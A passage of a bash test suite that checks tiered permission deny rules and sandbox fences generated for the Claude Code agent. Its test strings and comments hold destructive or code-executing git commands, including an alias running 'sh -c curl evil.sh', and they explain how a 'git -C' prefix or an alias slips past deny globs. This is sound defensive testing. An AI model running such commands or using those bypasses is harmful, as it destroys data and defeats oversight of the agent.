# never chose it. Cloudflare is opt-in behind a user-scoped API token, so attaching it is
# itself a decision: Medium respects that, High does not, because "no arbitrary executor
# is reachable" is High's whole proposition. Playwright is opt-in too, but nothing the
# user picks narrows what `browser_network_request` can reach, so its two arbitrary
# primitives go at Medium as well; only the in-page JS evaluator is High-only, because
# reading state out of a running dApp is ordinary testing. The two gated tiers' deny
# sets differ in exactly those two tools, which is why this is asserted by exact tool
# name rather than by count.
echo "[mcp executors by tier]"
# mcp_denied <tier> <tool> -> yes|no
mcp_denied() {
  python3 -c "
import json, sys
deny = (json.load(open(sys.argv[1])).get('permissions') or {}).get('deny') or []
print('yes' if sys.argv[2] in deny else 'no')" "$WORK/gen.$1.json" "$2" 2>/dev/null
}
for t in off relaxed; do
  assert_eq "no" "$(mcp_denied "$t" mcp__context-mode__ctx_execute)" \
    "$t leaves context-mode's ctx_execute callable (the hooks gate it)"
  assert_eq "no" "$(mcp_denied "$t" mcp__cloudflare__execute)" \
    "$t leaves cloudflare's execute callable (the hooks gate it)"
  for tool in mcp__playwright__browser_run_code_unsafe mcp__playwright__browser_network_request \
              mcp__playwright__browser_evaluate; do
    assert_eq "no" "$(mcp_denied "$t" "$tool")" "$t leaves playwright's $tool callable"
  done
done
assert_eq "yes" "$(mcp_denied medium mcp__context-mode__ctx_execute)" \
  "medium denies context-mode's ctx_execute (a default-on executor)"
assert_eq "no" "$(mcp_denied medium mcp__cloudflare__execute)" \
  "medium leaves cloudflare's execute callable (opt-in, so attaching it is the user's choice)"
# Playwright: both arbitrary primitives go at Medium, and only the in-page JS evaluator
# waits for High. Asserted in both directions, or "deny the dangerous one" could quietly
# become "deny the one whose name says unsafe".
for tool in mcp__playwright__browser_run_code_unsafe mcp__playwright__browser_network_request; do
  assert_eq "yes" "$(mcp_denied medium "$tool")" "medium denies playwright's $tool"
done
assert_eq "no" "$(mcp_denied medium mcp__playwright__browser_evaluate)" \
  "medium keeps playwright's browser_evaluate (reading dApp state is ordinary testing)"
for tool in mcp__context-mode__ctx_execute mcp__cloudflare__execute \
            mcp__playwright__browser_run_code_unsafe mcp__playwright__browser_network_request \
            mcp__playwright__browser_evaluate; do
  assert_eq "yes" "$(mcp_denied high "$tool")" "high denies $tool"
done
# The kit's own browser flows name only these two (/test-ts, /product-review), so no
# tier may deny either — the easy bug being a server-wide deny that takes the whole
# server out and the kit's documented browser QA with it.
for t in $TIERS; do
  for tool in mcp__playwright__browser_navigate mcp__playwright__browser_snapshot; do
    assert_eq "no" "$(mcp_denied "$t" "$tool")" "$t keeps playwright's $tool, which /test-ts and /product-review drive"
  done
done
# cloudflare/mcp has exactly three tools and only `execute` mutates. Documentation
# lookup is the main reason to attach the server, so the two read-only tools must keep
# working at every tier — a server-wide mcp__cloudflare__* deny would be the easy bug.
for t in $TIERS; do
  for tool in mcp__cloudflare__docs mcp__cloudflare__search; do
    assert_eq "no" "$(mcp_denied "$t" "$tool")" "$t keeps cloudflare's read-only $tool callable"
  done
done

# A parenthesised mcp__ rule is SKIPPED when Claude Code loads a settings file, so an
# argument filter would read as policy and be none. No tier may emit one, in any list.
MCP_PARENS="$(python3 -c "
import json
bad = []
for t in '$TIERS'.split():
    perms = json.load(open('$WORK/gen.%s.json' % t)).get('permissions') or {}
    for key in ('allow', 'ask', 'deny'):
        for rule in perms.get(key) or []:
            if rule.startswith('mcp__') and '(' in rule:
                bad.append('%s:%s' % (t, rule))
print(';'.join(bad) or 'none')" 2>/dev/null)"
assert_eq "none" "$MCP_PARENS" "no tier emits an mcp__ rule with parentheses"
if [ "$BASH_VARY" != "Bash(gh api *)@medium,high" ]; then
  printf '    Bash denies that vary by tier: %s\n' "$BASH_VARY"
  printf '    mcp denies per tier: %s\n' "$MCP_BY_TIER"
fi
# A few members of that set, spot-checked once (the full list lives in the generator).
#
# These six are the ones no user-facing table names, so nothing else would notice them
# going: the wrapper and whole-binary denies live in docs/firewall.md's prose, not in its
# gate table. The transport-override and `gh issue delete` pins that used to sit here are
# gone, and deliberately not replaced — tests/test_doc_gates.sh reaches them from the
# gate table row that promises them, which is a pin on the sentence a reader reads rather
# than a second copy of the rule strings beside it.
DENY_LIVE="$(python3 -c "
import json
print('\n'.join((json.load(open('$WORK/gen.relaxed.json')).get('permissions') or {}).get('deny') or []))" 2>/dev/null)"
for r in "Bash(claude *)" "Bash(env *)" "Bash(git -c *)" "Bash(git -C *)" "Bash(security *)" "Edit(/.safe-ai-skill/**)" \
         "Bash(git fetch *--upload-pack*)" "Bash(git fetch --upload-pack*)" \
         "Bash(git push *--receive-pack*)" "Bash(git push --receive-pack*)" \
         "Bash(git push *--exec*)" "Bash(git push --exec*)" \
         "Bash(gh issue delete *)" "Bash(gh repo delete *)" "Bash(gh repo delete)" \
         "Bash(git config *alias.*)" "Bash(git config alias.*)" \
         "Bash(git --config-env*)" "Bash(git reflog delete *)" "Bash(git reflog drop *)" \
         "Bash(git --exec-path=*)"; do
  TOTAL=$((TOTAL + 1))
  if grep -qxF "$r" <<<"$DENY_LIVE"; then
    echo "  PASS: the never-allowed set denies $r"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: the never-allowed set is missing $r"
    FAIL=$((FAIL + 1))
  fi
done

# git -c and git -C are both denied at EVERY tier, and the second one is the easy rule to
# mistake for lazy breadth. `-c` is arbitrary code execution via core.fsmonitor. `-C`
# merely changes directory -- but every destructive git deny is a glob anchored on the
# literal subcommand, so a `git -C <dir>` prefix sits in front and none of them match:
# `git -C . clean -xdf` and `git -C . reflog expire --expire=now --all` both walk
# straight through, and `-C .` needs no second repository so no sandbox fence is behind
# it. Lowering this one rule would make the whole destructive-git set advisory below
# High, which is why it is asserted here per tier rather than only spot-checked above.
echo "[git -c and git -C are tier-invariant]"
for t in $TIERS; do
  PAIR="$(python3 -c "
import json
deny = set((json.load(open('$WORK/gen.$t.json')).get('permissions') or {}).get('deny') or [])
print('%s/%s' % ('deny' if 'Bash(git -c *)' in deny else 'allow',
                 'deny' if 'Bash(git -C *)' in deny else 'allow'))" 2>/dev/null)"
  assert_eq "deny/deny" "$PAIR" "$t: git -c and git -C both denied (a -C prefix defeats every destructive git glob)"
done

# git --config-env is git -c with the value read from an environment variable, and the
# reflog's delete and drop take away the same record `reflog expire` does. All three are
# denied at every tier, like the rules they sit beside. The shape of the --config-env rule
# is the point worth pinning: its `*` touches the option name, so it may be empty and
# matches `=` as readily as a space. A ` *` — the shape `git -c *` has — requires the
# space and leaves the `=` spelling open, which the planted check proves.
echo "[git --config-env and reflog delete/drop]"
for t in $TIERS; do
  MISSING="$(python3 -c "
import json
deny = set((json.load(open('$WORK/gen.$t.json')).get('permissions') or {}).get('deny') or [])
want = ['Bash(git --config-env*)', 'Bash(git reflog delete *)', 'Bash(git reflog drop *)']
print(' '.join(r for r in want if r not in deny) or 'none')" 2>/dev/null)"
  assert_eq "none" "$MISSING" "$t denies git --config-env, git reflog delete and git reflog drop"
done
for cmd in "git --config-env=core.fsmonitor=X status" "git --config-env core.fsmonitor=X status" \
           "git --config-env"; do
  assert_eq "yes" "$(python3 "$WORK/gap_probe.py" --match "git --config-env*" "$cmd" 2>&1)" \
    "Bash(git --config-env*) matches \`$cmd\`"
done
assert_eq "no" "$(python3 "$WORK/gap_probe.py" --match "git --config-env *" \
  "git --config-env=core.fsmonitor=X status" 2>&1)" \
  "planted: the spaced shape Bash(git --config-env *) would leave the = spelling open"
# git --exec-path=<dir> makes git run the helpers and subcommands it finds in dir.
# Denied at every tier with the `=` in the rule: the bare option only prints the path,
# and git reads the spaced form the same way, so both stay open.
echo "[git --exec-path=]"
for t in $TIERS; do
  assert_eq "yes" "$(python3 -c "
import json
deny = set((json.load(open('$WORK/gen.$t.json')).get('permissions') or {}).get('deny') or [])
print('yes' if 'Bash(git --exec-path=*)' in deny else 'no')" 2>/dev/null)" "$t denies git --exec-path="
  assert_eq "none" "$(python3 "$WORK/gap_probe.py" --deny-matches "$WORK/gen.$t.json" "git --exec-path" 2>&1)" \
    "$t leaves the bare \`git --exec-path\` open (it prints the path)"
done
for cmd in "git --exec-path=/tmp/x ls-remote origin" "git --exec-path=/tmp/x"; do
  assert_eq "yes" "$(python3 "$WORK/gap_probe.py" --match "git --exec-path=*" "$cmd" 2>&1)" \
    "Bash(git --exec-path=*) matches \`$cmd\`"
done
for verb in "git reflog delete" "git reflog drop"; do
  assert_eq "yes" "$(python3 "$WORK/gap_probe.py" --match "$verb *" "$verb" 2>&1)" \
    "Bash($verb *) denies a bare \`$verb\` by itself, so it needs no twin"
done
assert_eq "yes" "$(python3 "$WORK/gap_probe.py" --match "git reflog delete *" \
  "git reflog delete --rewrite --updateref HEAD@{1}" 2>&1)" "Bash(git reflog delete *) matches its flagged form"
assert_eq "yes" "$(python3 "$WORK/gap_probe.py" --match "git reflog drop *" \
  "git reflog drop --all --single-worktree" 2>&1)" "Bash(git reflog drop *) matches its flagged form"
# The reads beside them stay open at every tier, judged against the whole generated deny
# set rather than the two new rules, so a broader rule added later is caught here too.
for t in $TIERS; do
  for cmd in "git reflog" "git reflog show" "git reflog show --date=iso HEAD" "git reflog list" \
             "git reflog exists refs/heads/main"; do
    assert_eq "none" "$(python3 "$WORK/gap_probe.py" --deny-matches "$WORK/gen.$t.json" "$cmd" 2>&1)" \
      "$t leaves \`$cmd\` open (a read)"
  done
done
python3 - "$WORK/gen.relaxed.json" "$WORK/planted-reflog.json" <<'PY'
import json, sys
s = json.load(open(sys.argv[1]))
s["permissions"]["deny"].append("Bash(git reflog *)")
json.dump(s, open(sys.argv[2], "w"))
PY
assert_eq "Bash(git reflog *)" "$(python3 "$WORK/gap_probe.py" --deny-matches "$WORK/planted-reflog.json" "git reflog show" 2>&1)" \
  "planted: a whole-subcommand Bash(git reflog *) would close the reads, and the check names it"

# High fences .git/config and .git/hooks/ from the file tools. Claude Code's sandbox
# already refuses shell writes there at every tier that runs it, so the gap was the
# Edit/Write tools: a protected path prompts, goes to auto mode's classifier, and is
# written unasked under bypassPermissions. Only an Edit deny holds in every mode.
# Judged as an effective permission on a PATH, with the gitignore anchors the kit emits:
# `**/x` at any depth under the project, `/x` at its root, `//x` absolute.
echo "[git config and hooks, High only]"
cat > "$WORK/edit_deny.py" <<'PY'
import json, re, sys

def to_regex(pat):
    out, i = [], 0
    if pat.startswith("**/"):
        out.append("(?:.*/)?"); i = 3
    while i < len(pat):
        if pat.startswith("/**", i):
            out.append("(?:/.*)?"); i += 3
        elif pat.startswith("**", i):
            out.append(".*"); i += 2
        elif pat[i] == "\\" and i + 1 < len(pat):
            out.append(re.escape(pat[i + 1])); i += 2
        elif pat[i] == "*":
            out.append("[^/]*"); i += 1
        elif pat[i] == "?":
            out.append("[^/]"); i += 1
        else:
            out.append(re.escape(pat[i])); i += 1
    return re.compile("^" + "".join(out) + "$")

def denied(deny, path):
    """path: project-relative (".git/config") or absolute ("/x/.git/config")."""
    for rule in deny:
        if not (rule.startswith("Edit(") and rule.endswith(")")):
            continue
        pat = rule[5:-1]
        if pat.startswith("//"):
            if path.startswith("/") and to_regex(pat[1:]).match(path):
                return rule
        elif pat.startswith("~/"):
            continue
        elif pat.startswith("/"):
            if not path.startswith("/") and to_regex(pat[1:]).match(path):
                return rule
        elif not path.startswith("/") and to_regex(pat).match(path):
            return rule
    return None

deny = (json.load(open(sys.argv[1])).get("permissions") or {}).get("deny") or []
want = sys.argv[2]
bad = [p for p in sys.argv[3:] if (denied(deny, p) is not None) != (want == "denied")]
print(" ".join(bad) or "none")
PY
GIT_FENCED=".git/config .git/hooks .git/hooks/pre-commit .git/hooks/post-checkout vendor/lib/.git/config vendor/lib/.git/hooks/pre-push"
GIT_INTERNALS=".git/HEAD .git/index .git/refs/heads/main .git/objects/ab/cdef0123 .git/COMMIT_EDITMSG .git/info/exclude .git/packed-refs .git/FETCH_HEAD .git/worktrees/x/HEAD .git/modules/sub/HEAD .gitignore .gitattributes src/config"
# shellcheck disable=SC2086
assert_eq "none" "$(python3 "$WORK/edit_deny.py" "$WORK/gen.high.json" denied $GIT_FENCED 2>&1)" \
  "high denies the file tools every repository's .git/config and .git/hooks/, nested ones included"
# shellcheck disable=SC2086
assert_eq "none" "$(python3 "$WORK/edit_deny.py" "$WORK/gen.high.json" open $GIT_INTERNALS 2>&1)" \
  "high leaves the rest of .git writable: HEAD, index, refs, objects and the commit message"
for t in off relaxed medium; do
  # shellcheck disable=SC2086
  assert_eq "none" "$(python3 "$WORK/edit_deny.py" "$WORK/gen.$t.json" open $GIT_FENCED 2>&1)" \
    "$t carries none of it (High only)"
done
assert_eq "none" "$(python3 -c "
import json
deny = (json.load(open('$WORK/gen.high.json')).get('permissions') or {}).get('deny') or []
print(' '.join(r for r in deny if r.startswith('Edit(//') and '.git/' in r) or 'none')" 2>/dev/null)" \
  "a project that is its own repository gets no absolute .git rule, so no machine path"
# Planted holes in both directions: the fence with its hooks rule dropped must show, and
# a fence widened to the whole of .git — which would refuse every commit — must too.
python3 - "$WORK/gen.high.json" "$WORK/planted-git.json" <<'PY'
import json, sys
s = json.load(open(sys.argv[1]))
s["permissions"]["deny"] = [r for r in s["permissions"]["deny"] if r != "Edit(**/.git/hooks/**)"]
json.dump(s, open(sys.argv[2], "w"))
PY
assert_contains "$(python3 "$WORK/edit_deny.py" "$WORK/planted-git.json" denied $GIT_FENCED 2>&1)" \
  ".git/hooks/pre-commit" "planted: dropping Edit(**/.git/hooks/**) leaves a hook writable, and the check says so"
python3 - "$WORK/gen.high.json" "$WORK/planted-git.json" <<'PY'
import json, sys
s = json.load(open(sys.argv[1]))
s["permissions"]["deny"].append("Edit(**/.git/**)")
json.dump(s, open(sys.argv[2], "w"))
PY
assert_contains "$(python3 "$WORK/edit_deny.py" "$WORK/planted-git.json" open $GIT_INTERNALS 2>&1)" \
  ".git/index" "planted: an Edit(**/.git/**) fence would deny the index, and the check says so"

# A linked worktree's .git is a file; the config and hooks live in the common dir, outside
# the worktree whether it is a sibling or nested the way Claude Code's own -w worktrees are.
# High names that dir absolutely, under the same condition git_common_write() grants it,
# with glob characters escaped. Real git, in throwaway repos under the test's temp dir.
WT_MAIN="$WORK/wt main[1]"
WT_SIB="$WORK/wt-sibling"
WT_OK=1
{
  git init -q "$WT_MAIN" &&
  (cd "$WT_MAIN" && GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@example.invalid \
     GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@example.invalid \
     git commit -q --allow-empty -m init) &&
  (cd "$WT_MAIN" && git worktree add -q -b wt-sibling "$WT_SIB") &&
  (cd "$WT_MAIN" && git worktree add -q -b wt-inner .claude/worktrees/inner)
} > "$WORK/wt.log" 2>&1 || WT_OK=0
TOTAL=$((TOTAL + 1))
if [ "$WT_OK" -eq 1 ]; then
  echo "  PASS: built a repository with a sibling and a nested linked worktree"
  PASS=$((PASS + 1))
else
  echo "  FAIL: could not build the worktree fixture: $(tail -3 "$WORK/wt.log")"
  FAIL=$((FAIL + 1))
fi
if [ "$WT_OK" -eq 1 ]; then
  COMMON="$(python3 -c "import os, sys; print(os.path.realpath(sys.argv[1]))" "$WT_MAIN/.git")"
  for wt in "$WT_SIB" "$WT_MAIN/.claude/worktrees/inner"; do
    WT_LABEL="$(basename "$wt")"
    mkdir -p "$wt/.claude/bin"
    cp "$REPO_ROOT/.claude/settings.json" "$SECURITY" "$wt/.claude/"
    cp "$FIREWALL" "$wt/.claude/bin/firewall.sh"
    for t in high relaxed medium; do
      (cd "$wt" && CLAUDE_PROJECT_DIR="$wt" bash .claude/bin/firewall.sh apply "$t") \
        > "$WORK/wt-apply.log" 2>&1 || true
      cp "$wt/.claude/settings.json" "$WORK/wt.$t.json"
    done
    assert_eq "none" "$(python3 "$WORK/edit_deny.py" "$WORK/wt.high.json" denied \
      "$COMMON/config" "$COMMON/hooks" "$COMMON/hooks/pre-commit" 2>&1)" \
      "worktree '$WT_LABEL' at high: the common dir's config and hooks are denied by absolute path"
    assert_contains "$(python3 -c "
import json, sys
deny = (json.load(open(sys.argv[1])).get('permissions') or {}).get('deny') or []
print(' '.join(r for r in deny if r.startswith('Edit(//')))" "$WORK/wt.high.json" 2>/dev/null)" \
      'wt main\[1\]/.git/config)' "worktree '$WT_LABEL' at high: brackets in the path are escaped, so the rule names that directory alone"
    for t in relaxed medium; do
      assert_eq "none" "$(python3 -c "
import json, sys
deny = (json.load(open(sys.argv[1])).get('permissions') or {}).get('deny') or []
print(' '.join(r for r in deny if '.git/' in r and r.startswith('Edit(')) or 'none')" "$WORK/wt.$t.json" 2>/dev/null)" \
        "worktree '$WT_LABEL' at $t: no .git Edit rule (High only, even in a worktree)"
    done
    # Below High the common dir stays shell-writable on purpose: shippability gate 4
    # keeps a first-time `git submodule update --init` working in a linked worktree, and
    # that writes submodule.<name>.url into the common config.
    for t in relaxed medium; do
      assert_eq "none" "$(python3 -c "
import json, sys
dw = ((json.load(open(sys.argv[1])).get('sandbox') or {}).get('filesystem') or {}).get('denyWrite') or []
print(' '.join(p for p in dw if p.startswith(sys.argv[2])) or 'none')" "$WORK/wt.$t.json" "$COMMON" 2>/dev/null)" \
        "worktree '$WT_LABEL' at $t: no shell fence on the common dir, so submodule init keeps working"
    done
  done
  # Planted: the same High file with its absolute rules taken out, which is what the
  # project-relative rules alone would leave — the common dir's config writable.
  python3 - "$WORK/wt.high.json" "$WORK/planted-wt.json" <<'PY'
import json, sys
s = json.load(open(sys.argv[1]))
s["permissions"]["deny"] = [r for r in s["permissions"]["deny"] if not r.startswith("Edit(//")
                            or ".git/" not in r]
json.dump(s, open(sys.argv[2], "w"))
PY
  assert_contains "$(python3 "$WORK/edit_deny.py" "$WORK/planted-wt.json" denied "$COMMON/config" 2>&1)" \
    "$COMMON/config" "planted: without the absolute rules a worktree's common config is writable, and the check says so"

  # #165: in a linked worktree of the KIT's repository the same absolute path would land
  # in the settings.json every install copies. Refused there for every user tier, dry
  # run aside; maintainer is local-only and still applies. A user project's worktree is
  # unaffected (above): it needs the path, and on any other machine the path is inert.
  for wt in "$WT_SIB" "$WT_MAIN/.claude/worktrees/inner"; do
    WT_LABEL="$(basename "$wt")"
    cp "$REPO_ROOT/.claude/settings.json" "$SECURITY" "$wt/.claude/"
    touch "$wt/CLAUDE-solana.md" "$wt/install.sh"
    cp "$wt/.claude/settings.json" "$WORK/wt-kit-before.json"
    cp "$wt/.claude/security.json" "$WORK/wt-kit-before-sec.json"
    for t in relaxed high; do
      set +e
      WT_OUT="$( (cd "$wt" && CLAUDE_PROJECT_DIR="$wt" bash .claude/bin/firewall.sh apply "$t") 2>&1 )"; WT_RC=$?
      set -e
      TOTAL=$((TOTAL + 1))
      if [ "$WT_RC" -ne 0 ] && printf '%s' "$WT_OUT" | grep -q "refusing to write" \
         && cmp -s "$WORK/wt-kit-before.json" "$wt/.claude/settings.json" \
         && cmp -s "$WORK/wt-kit-before-sec.json" "$wt/.claude/security.json"; then
        echo "  PASS: kit worktree '$WT_LABEL' at $t: apply refused, both files untouched"
        PASS=$((PASS + 1))
      else
        echo "  FAIL: kit worktree '$WT_LABEL' at $t: apply not refused (exit $WT_RC): $(printf '%s' "$WT_OUT" | head -2)"
        FAIL=$((FAIL + 1))
      fi
    done
    set +e
    WT_OUT="$( (cd "$wt" && CLAUDE_PROJECT_DIR="$wt" bash .claude/bin/firewall.sh apply relaxed --dry-run) 2>&1 )"; WT_RC=$?
    set -e
    assert_eq "0" "$WT_RC" "kit worktree '$WT_LABEL': --dry-run still reports (exit 0)"
    assert_contains "$WT_OUT" "would be refused" "kit worktree '$WT_LABEL': --dry-run says a real apply would be refused"
    set +e
    (cd "$wt" && CLAUDE_PROJECT_DIR="$wt" bash .claude/bin/firewall.sh apply maintainer) > "$WORK/wt-apply.log" 2>&1; WT_RC=$?
    set -e
    assert_eq "0" "$WT_RC" "kit worktree '$WT_LABEL': maintainer, the local-only tier, still applies"
    assert_file_contains "$wt/.claude/settings.json" "$COMMON" \
      "kit worktree '$WT_LABEL': maintainer grants the common dir, so git keeps working there"
    rm -f "$wt/CLAUDE-solana.md" "$wt/install.sh"
  done
fi

# The kit installed in a monorepo's subfolder: the parent repository's .git is the common
# dir, outside the project, so git_common_write() grants it to the shell. High denies its
# config and hooks/ by absolute path, and that Edit deny reaches the sandbox as a write
# deny too. Below High nothing does, deliberately, as for a linked worktree above. A plain
# repository gets no absolute .git entry at any tier: its .git is inside the project.
echo "[a monorepo parent's .git, and a plain repository]"
MONO="$WORK/mono"
if git init -q "$MONO" > "$WORK/mono.log" 2>&1 && mkdir -p "$MONO/app/.claude/bin" && git init -q "$WORK/plainrepo" >> "$WORK/mono.log" 2>&1 \
   && mkdir -p "$WORK/plainrepo/.claude/bin"; then
  MCOMMON="$(python3 -c "import os, sys; print(os.path.realpath(sys.argv[1]))" "$MONO/.git")"
  PCOMMON="$(python3 -c "import os, sys; print(os.path.realpath(sys.argv[1]))" "$WORK/plainrepo/.git")"
  for d in "$MONO/app" "$WORK/plainrepo"; do
    cp "$REPO_ROOT/.claude/settings.json" "$SECURITY" "$d/.claude/"
    cp "$FIREWALL" "$d/.claude/bin/firewall.sh"
  done
  for t in off relaxed medium high; do
    (cd "$MONO/app" && CLAUDE_PROJECT_DIR="$MONO/app" bash .claude/bin/firewall.sh apply "$t") > "$WORK/mono-apply.log" 2>&1 || true
    cp "$MONO/app/.claude/settings.json" "$WORK/mono.$t.json"
    (cd "$WORK/plainrepo" && CLAUDE_PROJECT_DIR="$WORK/plainrepo" bash .claude/bin/firewall.sh apply "$t") > "$WORK/plain-apply.log" 2>&1 || true
    cp "$WORK/plainrepo/.claude/settings.json" "$WORK/plainrepo.$t.json"
  done
  assert_eq "none" "$(python3 "$WORK/edit_deny.py" "$WORK/mono.high.json" denied \
    "$MCOMMON/config" "$MCOMMON/hooks" "$MCOMMON/hooks/pre-commit" 2>&1)" \
    "monorepo at high: the parent's .git config and hooks are denied by absolute path"
  for t in off relaxed medium; do
    assert_eq "none" "$(python3 -c "
import json, sys
s = json.load(open(sys.argv[1]))
deny = (s.get('permissions') or {}).get('deny') or []
dw = ((s.get('sandbox') or {}).get('filesystem') or {}).get('denyWrite') or []
print(' '.join([r for r in deny if sys.argv[2] in r] + [p for p in dw if p.startswith(sys.argv[2])]) or 'none')" "$WORK/mono.$t.json" "$MCOMMON" 2>/dev/null)" \
      "monorepo at $t: no fence on the parent's .git (submodule init keeps working)"
  done
  # The maintainer tier is built from Relaxed's plan, so at rule set 9 it inherits both
  # halves: no fence on an out-of-project common dir (a kit maintainer's linked worktree
  # is that case, and the tier exists so `git submodule update --init` works there), and
  # the --exec-path= deny, which is not one of its four omissions.
  touch "$MONO/app/CLAUDE-solana.md" "$MONO/app/install.sh"
  (cd "$MONO/app" && CLAUDE_PROJECT_DIR="$MONO/app" bash .claude/bin/firewall.sh apply maintainer) > "$WORK/mono-apply.log" 2>&1 || true
  assert_eq "maintainer none yes" "$(python3 -c "
import json, sys
s = json.load(open(sys.argv[1]))
deny = (s.get('permissions') or {}).get('deny') or []
dw = ((s.get('sandbox') or {}).get('filesystem') or {}).get('denyWrite') or []
fence = [r for r in deny if sys.argv[2] in r] + [p for p in dw if p.startswith(sys.argv[2])]
tier = (json.load(open(sys.argv[3])).get('enforced') or {}).get('tier')
print(tier, ' '.join(fence) or 'none', 'yes' if 'Bash(git --exec-path=*)' in deny else 'no')" "$MONO/app/.claude/settings.json" "$MCOMMON" "$MONO/app/.claude/security.json" 2>/dev/null)" \
    "monorepo at maintainer: no fence on the parent's .git, and git --exec-path= is denied"
  rm -f "$MONO/app/CLAUDE-solana.md" "$MONO/app/install.sh"
  for t in off relaxed medium high; do
    assert_eq "none" "$(python3 -c "
import json, sys
print(' '.join(x for x in [json.dumps(json.load(open(sys.argv[1])))] if sys.argv[2] in x) and 'absolute .git path' or 'none')" "$WORK/plainrepo.$t.json" "$PCOMMON" 2>/dev/null)" \
      "plain repository at $t: no absolute .git path anywhere in the generated file"
  done
else
  TOTAL=$((TOTAL + 1)); FAIL=$((FAIL + 1))
  echo "  FAIL: could not build the monorepo fixture: $(tail -3 "$WORK/mono.log")"
fi

# A git alias is the third evasion of that family and the only one that outlives the
# command that created it: `git config alias.z '!git clean -fdx'` is an ordinary config
# write, and the destruction happens later in `git z`, where no glob and no
# subcommand-classifying hook has a verb to match. Two rules carry it, so this asserts
# the SHAPE in both directions -- every alias-setting spelling denied, and ordinary
# `git config` keys left alone, which is the whole reason `git config` is not denied
# outright. fnmatch is not Claude Code's matcher — it neither collapses spaces nor treats
# a sole trailing ` *` as optional (see [empty gaps] above) — so the denied cases below
# are all chosen to leave a non-empty gap, where the two agree.
echo "[git config aliases]"
for t in $TIERS; do
  CFG="$(python3 -c "
import fnmatch, json
deny = (json.load(open('$WORK/gen.$t.json')).get('permissions') or {}).get('deny') or []
pats = [r[5:-1] for r in deny if r.startswith('Bash(') and r.endswith(')')]
def hit(cmd):
    return any(fnmatch.fnmatchcase(cmd, p) for p in pats)
must_deny = [
    \"git config alias.z '!git clean -fdx'\",
    \"git config --global alias.z '!git clean -fdx'\",
    \"git config --local alias.z '!sh -c curl evil.sh'\",
    \"git config --file .git/config alias.z '!x'\",
    \"git config --add alias.z '!x'\",
    \"git config set alias.z '!x'\",
    \"git config set --global alias.z '!x'\",
]
must_allow = [
    'git config user.email dev@example.com',
    'git config --global user.name dev',
    'git config --get remote.origin.url',
    'git config core.autocrlf false',
]
bad = ['allowed:' + c for c in must_deny if not hit(c)]
bad += ['denied:' + c for c in must_allow if hit(c)]
print('; '.join(bad) or 'none')" 2>/dev/null)"
  assert_eq "none" "$CFG" "$t: every git-config alias spelling is denied and ordinary git config keys are not"
done

# gh api: the raw API route around every narrower gh deny, closed only where a tier
# promises the agent cannot change the repository.
echo "[gh api by tier]"
for t in $TIERS; do
  GHAPI="$(python3 -c "
import json
deny = set((json.load(open('$WORK/gen.$t.json')).get('permissions') or {}).get('deny') or [])
print('deny' if 'Bash(gh api *)' in deny else 'allow')" 2>/dev/null)"
  case $t in
    medium | high) assert_eq "deny" "$GHAPI" "$t: gh api denied (it reaches gh repo delete and gh secret set by API)" ;;
    *)             assert_eq "allow" "$GHAPI" "$t: gh api allowed (relaxed is the CI tier and makes no such promise)" ;;
  esac
done
# Self-protection uses Edit(...), not Read(...): a Read deny also blocks Edit and Write
# but leaves NotebookEdit open, and would stop the kit reading its own config. Checked
# against High, the only tier that carries the self-protection group at all.
DENY_HIGH="$(python3 -c "
import json
print('\n'.join((json.load(open('$WORK/gen.high.json')).get('permissions') or {}).get('deny') or []))" 2>/dev/null)"
TOTAL=$((TOTAL + 1))
if grep -qF 'Edit(/.claude/security.json)' <<<"$DENY_HIGH" \
   && ! grep -qF 'Read(/.claude/security.json)' <<<"$DENY_HIGH"; then
  echo "  PASS: the kit's own config is self-protected with Edit(...), not Read(...)"
  PASS=$((PASS + 1))
else
  echo "  FAIL: expected Edit(/.claude/security.json) in deny and no Read(...) counterpart"
  FAIL=$((FAIL + 1))
fi

# ── the Solana config dir is never read-denied as a directory ───────────────
# Read denies project into sandbox.denyRead and the sandbox covers Bash *and children*,
# so a dir-wide deny leaves solana/anchor unable to resolve a signer at all ("Unable to
# read keypair file"). anchor init points Anchor.toml at that dir by default.
echo "[solana config dir]"
for t in $TIERS; do
  DIRWIDE="$(python3 -c "
import json
fs = ((json.load(open('$WORK/gen.$t.json')).get('sandbox') or {}).get('filesystem') or {})
base = '~/.config/solana'
bad = [e for e in (fs.get('denyRead') or [])
       if e.rstrip('/') == base or e in (base + '/**', base + '/*', base + '/')]
print(' '.join(bad) or 'none')" 2>/dev/null)"
  assert_eq "none" "$DIRWIDE" "$t: the Solana config directory itself is not in sandbox denyRead"
done
# Medium and High still deny the keypairs under it, and leave cli/config.yml readable
# so `solana config get` keeps working.
MED_JSON_DENY="$(python3 -c "
import json
fs = ((json.load(open('$WORK/gen.medium.json')).get('sandbox') or {}).get('filesystem') or {})
ent = [e for e in (fs.get('denyRead') or []) if e.startswith('~/.config/solana') and e.endswith('.json')]
print(' '.join(ent) or 'none')" 2>/dev/null)"
TOTAL=$((TOTAL + 1))
if [ "$MED_JSON_DENY" != "none" ]; then
  echo "  PASS: medium denies *.json under the Solana config dir ($MED_JSON_DENY)"
  PASS=$((PASS + 1))
else
  echo "  FAIL: medium denies nothing under the Solana config dir"
  FAIL=$((FAIL + 1))
fi
for t in medium high; do
  assert_eq "none" "$(python3 -c "
import json
fs = ((json.load(open('$WORK/gen.$t.json')).get('sandbox') or {}).get('filesystem') or {})
print(' '.join(e for e in (fs.get('denyRead') or []) if 'cli/config.yml' in e) or 'none')" 2>/dev/null)" \
    "$t leaves the Solana cli/config.yml readable (solana config get keeps working)"
done

# ── shippability carve-outs: toolchain roots, temp root, git common dir ─────
# Each of these broke a default install: cargo needs write to its registry cache,
# `mktemp -d` is in update.sh's frozen byte range, and a linked worktree's gitdir sits
# outside the working dir so submodule init needs it.
echo "[carve-outs]"
for t in $TIERS; do
  MISSING="$(python3 -c "
import json
d = json.load(open('$WORK/gen.$t.json'))
sb = d.get('sandbox') or {}
fs = sb.get('filesystem') or {}
denies = (fs.get('denyWrite') or []) + (fs.get('denyRead') or [])
if not sb.get('enabled') and not denies:
    print('none'); raise SystemExit      # nothing to carve out of
allowed = ' '.join((fs.get('allowWrite') or []) + (fs.get('allowRead') or []))
need = {
  'cargo root': ('~/.cargo',),
  'rustup root': ('~/.rustup',),
  'solana cache': ('~/.cache/solana',),
  'solana data': ('~/.local/share/solana',),
  'avm root': ('~/.avm',),
  'temp root': ('TMPDIR', '/tmp', '/private/tmp', '/var/folders'),
  'git common dir': ('.git', 'git-common-dir'),
}
